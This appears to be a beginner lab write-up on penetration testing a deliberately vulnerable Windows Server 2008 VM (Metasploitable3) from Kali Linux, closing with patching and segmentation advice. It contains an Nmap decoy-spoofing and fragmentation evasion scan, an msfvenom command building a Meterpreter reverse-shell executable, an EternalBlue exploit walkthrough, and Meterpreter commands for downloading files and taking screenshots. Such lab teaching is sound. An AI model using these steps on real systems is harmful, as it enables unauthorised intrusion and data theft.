## 1. Project Abstract üìù

This project offers a detailed exploration of ethical hacking techniques focused on Windows systems, providing a hands-on approach for beginners. The content spans the setup and configuration of a secure lab environment with Kali Linux in a virtual machine and a Windows target system (Metasploitable3). Key topics include network reconnaissance using Nmap for OS detection, port scanning, firewall identification, and bypass techniques, along with IP spoofing and packet fragmentation for evading detection. The project further explores enumeration and vulnerability scanning, enabling users to assess security flaws systematically. The final sections introduce Metasploit, covering payload generation with Msfvenom and establishing remote connections using Msfconsole, providing practical insight into penetration testing methodologies. It also aims to build foundational skills in Windows hacking within a controlled and ethical framework, setting the stage for advanced cybersecurity learning.

## 2. Learning Objectives üéØ

* Understand the fundamentals of setting up a virtual penetration testing lab.
* Gain hands-on experience with network scanning and reconnaissance using Nmap.
* Learn to identify vulnerabilities in a Windows target system.
* Master the basics of the Metasploit Framework for exploitation.
* Practice generating payloads with Msfvenom.
* Establish and interact with remote shells (Meterpreter) on a compromised system.
* Recognize major security concerns related to outdated operating systems and misconfigurations.
* Promote ethical hacking practices and responsible vulnerability disclosure.

## 3. Setting Up the Penetration Testing Environment ‚öôÔ∏è

A controlled virtual environment is crucial for practicing penetration testing techniques safely and legally.

### Required Software üìÄ

* **VirtualBox:** A powerful, free virtualization software for running multiple operating systems on a single host.
* **Kali Linux:** A Debian-derived Linux distribution designed for digital forensics and penetration testing. This will be our attacker machine.
* **Metasploitable3 (Windows Server 2008):** An intentionally vulnerable Windows virtual machine designed for penetration testing practice. This will be our target machine.

### Virtual Machine Setup üñ•Ô∏è

1.  **Download VirtualBox:** Obtain the installer from the official [VirtualBox website](https://www.virtualbox.org/wiki/Downloads).
2.  **Install Kali Linux VM:**
    * Download the Kali Linux ISO image from the [official Kali website](https://www.kali.org/get-kali/#kali-installer-images).
    * Create a new virtual machine in VirtualBox and install Kali Linux using the downloaded ISO.
3.  **Install Metasploitable3 VM:**
    * Metasploitable3 is available on [GitHub (Rapid7)](https://github.com/rapid7/metasploitable3). Follow the instructions provided there to set up the Windows Server 2008 VM. This often involves using tools like Vagrant and Packer, or downloading a pre-built VM if available.
4.  **Network Configuration:**
    * Ensure both Kali Linux and Metasploitable3 VMs are configured to be on the same virtual network (e.g., "Host-only Adapter" or "Internal Network" in VirtualBox) so they can communicate with each other, but are isolated from your main network for safety.
    * Verify network connectivity between the attacker (Kali) and target (Metasploitable3) VMs (e.g., using `ping`).

## 4. Phase 1: Network Reconnaissance with Nmap üì°

Nmap (Network Mapper) is an indispensable tool for network discovery and security auditing.

### Understanding Nmap üó∫Ô∏è

Nmap allows you to:
* Discover live hosts on a network.
* Identify open ports on target systems.
* Detect the operating system and services running on those ports.
* Identify potential firewall presence and evasion techniques.

### Key Nmap Techniques Explored üïµÔ∏è

The project demonstrates various Nmap scans, including:

* **OS Detection (`-O`):** Attempts to determine the operating system of the target.
    * Example: `nmap -O <target_IP>`
* **Port Scanning:**
    * **SYN Scan (`-sS`):** A stealthy scan that doesn't complete the TCP handshake. Often default for privileged users.
    * **TCP Connect Scan (`-sT`):** Completes the TCP handshake, more easily detectable. Default for unprivileged users.
    * **UDP Scan (`-sU`):** Scans for open UDP ports.
    * **Specific Port Scan (`-p <port_list>`):** Scans only specified ports (e.g., `-p 21,22,80,443`).
    * **Fast Scan (`-F`):** Scans fewer ports than the default scan.
* **Service Version Detection (`-sV`):** Tries to determine the version of the services running on open ports. This is crucial for finding known vulnerabilities.
    * Example: `nmap -sV <target_IP>`
* **Aggressive Scan (`-A`):** Enables OS detection, version detection, script scanning, and traceroute.
* **Firewall Evasion Techniques:**
    * **Packet Fragmentation (`-f`):** Splits packets into smaller pieces, potentially evading less sophisticated firewalls.
    * **IP Spoofing (Decoy Scan `-D RND:10`):** Makes the scan appear as if it's coming from multiple random IP addresses (decoys) in addition to your own.
    * Example Command shown in document: `nmap -sS <target_IP> -f -v -Pn -n --disable-arp-ping -D RND:10 -PS21,22,23,25,80,113,31337 -PA80,113,443,10042 --source-port 53` (This is a very specific and advanced scan combining multiple techniques).


## 5. Phase 2: Enumeration and Vulnerability Scanning üîç

Once initial reconnaissance is complete, the next step is to enumerate services and scan for known vulnerabilities.

### Identifying Open Ports and Services üö™

* Nmap results from Phase 1 provide a list of open ports (e.g., TCP port 445 - SMB, TCP port 3389 - RDP) and often the services running on them.
* The document highlights checking ports like:
    * **135/tcp (msrpc):** Microsoft RPC
    * **139/tcp (netbios-ssn):** NetBIOS Session Service
    * **445/tcp (microsoft-ds):** Microsoft Directory Services (often SMB)
    * **3389/tcp (ms-wbt-server):** Microsoft Terminal Services (RDP)

### Systematic Vulnerability Assessment üõ°Ô∏è

* With service versions identified (e.g., from `nmap -sV`), you can search for known exploits using databases like Exploit-DB or within Metasploit itself (`search` command).
* The document specifically mentions **EternalBlue (MS17-010)** as a vulnerability that Metasploitable3 (Windows Server 2008 target) is susceptible to if not patched. This vulnerability targets the SMBv1 service.

## 6. Phase 3: Exploitation with Metasploit üí•

Metasploit is a powerful open-source penetration testing framework.

### Introduction to Metasploit üõ†Ô∏è

* A collection of tools, exploits, and payloads used to probe, exploit, and gather information about systems.
* Simplifies the process of exploiting known vulnerabilities.

### Msfvenom: Payload Generation üí£

* A command-line instance of Metasploit used to generate custom payloads (shellcode).
* Can create standalone executables, or payloads in various formats for different scripting languages.
* Example from the document for generating a Windows Meterpreter reverse TCP payload:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali_IP_address> LPORT=<Listening_Port> -f exe > shell.exe
    ```
    * `-p`: Specifies the payload.
    * `LHOST`: Attacker's IP address (Kali Linux).
    * `LPORT`: Port on the attacker machine for the reverse connection.
    * `-f exe`: Output format as an executable.
    * `> shell.exe`: Saves the payload as `shell.exe`.

### Msfconsole: The Metasploit Framework Interface üíª

* The primary interface for working with Metasploit.
* Allows searching for exploits, configuring modules, setting payloads, and launching attacks.
* Key commands:
    * `search <exploit_name/CVE>`: Searches for modules.
    * `use <module_name>`: Selects a module (exploit, auxiliary, payload).
    * `show options`: Displays options for the selected module.
    * `set <OPTION_NAME> <value>`: Configures an option (e.g., `set RHOSTS <target_IP>`, `set LHOST <Kali_IP>`).
    * `set PAYLOAD <payload_name>`: Sets the payload to be used with an exploit.
    * `exploit` or `run`: Launches the attack.

### Exploitation Steps Walkthrough (Example: MS17-010 EternalBlue) üéØ

1.  **Launch `msfconsole`** on Kali Linux.
2.  **Search for the exploit:**
    ```msfconsole
    search ms17-010
    ```
3.  **Select the exploit module** (e.g., `exploit/windows/smb/ms17_010_eternalblue`):
    ```msfconsole
    use exploit/windows/smb/ms17_010_eternalblue
    ```
4.  **Show options:**
    ```msfconsole
    show options
    ```
5.  **Set required options:**
    * `set RHOSTS <Metasploitable3_IP>` (Target IP)
    * (LHOST and LPORT might be automatically set or may need to be configured depending on the chosen payload).
6.  **Set a payload** (Metasploit might suggest a default, or you can choose one like `windows/x64/meterpreter/reverse_tcp`):
    ```msfconsole
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    ```
    Ensure LHOST (Kali IP) and LPORT are correctly set for the payload.
7.  **Run the exploit:**
    ```msfconsole
    exploit
    ```

### Post-Exploitation (Meterpreter)  M

* If the exploit is successful, a **Meterpreter session** will open. Meterpreter is an advanced, dynamically extensible payload.
* Meterpreter provides an interactive shell on the compromised system with powerful capabilities:
    * `sysinfo`: Displays system information of the target.
    * `ls` / `dir`: Lists files and directories.
    * `pwd`: Shows the current working directory on the target.
    * `download <file>`: Downloads a file from the target.
    * `upload <file>`: Uploads a file to the target.
    * `screenshot`: Takes a screenshot of the target's desktop.
    * `ps`: Lists running processes.
    * `migrate <pid>`: Migrates Meterpreter to another process to maintain persistence or escalate privileges.
    * `getuid`: Shows the user ID the Meterpreter session is running under.
    * `shell`: Drops into a standard command shell on the target.
    * And many more commands and modules...
* The document shows using `sysinfo` and `ls` within a Meterpreter session.

## 7. Key Security Concerns & Mitigation üîê

This project highlights several security concerns, particularly relevant to outdated systems like Windows Server 2008 (as in Metasploitable3):

* **Outdated Operating Systems:** Unpatched and end-of-life OS versions are prime targets due to known, unpatched vulnerabilities (e.g., MS17-010).
    * **Mitigation:** Regularly update and patch systems. Upgrade from unsupported OS versions.
* **Weak/Default Credentials:** Not explicitly detailed in the exploit path here but a common vulnerability.
    * **Mitigation:** Use strong, unique passwords. Change default credentials.
* **Unnecessary Services Exposed:** More services running mean a larger attack surface.
    * **Mitigation:** Disable unnecessary services. Implement a principle of least privilege.
* **Firewall Misconfigurations:** Improperly configured firewalls may not block malicious traffic or may be bypassed.
    * **Mitigation:** Properly configure host-based and network firewalls. Regularly review firewall rules.
* **Lack of Network Segmentation:** Flat networks allow attackers to move laterally easily once a single host is compromised.
    * **Mitigation:** Implement network segmentation to isolate critical systems.

## 8. Conclusion ‚úÖ

This project successfully demonstrated the process of Windows penetration testing using Nmap for reconnaissance and Metasploit for exploitation within a virtual lab environment. Key takeaways include:

* The importance of setting up a safe and isolated lab for practice.
* The power of Nmap for discovering network information and potential vulnerabilities.
* The effectiveness of Metasploit in exploiting known vulnerabilities like MS17-010.
* The capabilities of Meterpreter for post-exploitation activities.
* A practical understanding of how outdated systems can be compromised and the importance of regular patching and security best practices.

By conducting these exercises, users can gain valuable hands-on experience, understand attacker methodologies, and ultimately be better equipped to defend systems.
